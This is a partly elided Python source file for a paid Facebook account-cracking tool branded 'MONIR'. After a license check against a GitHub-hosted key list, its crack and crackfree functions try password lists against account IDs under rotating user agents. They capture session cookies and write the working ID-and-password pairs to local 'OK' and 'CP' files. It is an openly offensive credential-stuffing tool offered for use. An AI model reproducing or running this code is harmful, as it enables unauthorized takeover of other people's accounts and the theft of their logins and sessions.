...
logo =(f"""
                                                                       ╔══════════════════════════════════════════════╗
      \x1b[38;5;196m███    ███  \033[38;5;46m██████  \033[33;1m███    ██ \033[34;1m██ \033[37;1m██████      
      \x1b[38;5;196m████  ████ \033[38;5;46m██    ██ \033[33;1m████   ██ \033[34;1m██ \033[37;1m██   ██     
      \x1b[38;5;196m██ ████ ██ \033[38;5;46m██    ██ \033[33;1m██ ██  ██ \033[34;1m██ \033[37;1m██████      
      \x1b[38;5;196m██  ██  ██ \033[38;5;46m██    ██ \033[33;1m██  ██ ██ \033[34;1m██ \033[37;1m██   ██     
      \x1b[38;5;196m██      ██  \033[38;5;46m██████  \033[33;1m██   ████ \033[34;1m██ \033[37;1m██   ██     
...
[] TOOLS        :     FILE-CLONING
[] TYPE         :     PREMIUM
[] FACEBOOK     :     MONIR HOSSAIN 
[] VERSION      :     9.9
[] MESSENGER    :     MONIR HOSSAIN 
\33[1;32m──────────────────────────────────────────────────""")
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/MONIR-HOSSAIN221/MONIR-PAID71/blob/main/Afroveal2.txt').text
    if id in httpCaht:
      print(fuckyoursali)
...
os.system('espeak -a 300 " Welcome,   to,  MONIR ,  V I P,  Tools"')
def back():
	login()
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[MONIR-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mMONIR-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[🌺]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                print(f'\033[38;5;196m────────────────────────────────────────────────\033[1;37m')
...
def crackfree(idf,pwv):
    global loop,ok,CP
    sys.stdout.write(f"\r{H}[MONIR-ON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mMONIR-Cp🖤\033[1;91m] {idf} • {pw}')
                print(f'\033[38;5;196m───────────────────────────────────────────────\033[1;37m')
                os.system('espeak -a 300 " CP, ID"')
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•MONIR-Ok💙] \033[1;92m{idf} • \033[1;92m{pw} ')
                print(f'\033[38;5;196m────────────────────────────────────────────────\033[1;37m')
                os.system('espeak -a 300 " MONIR,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
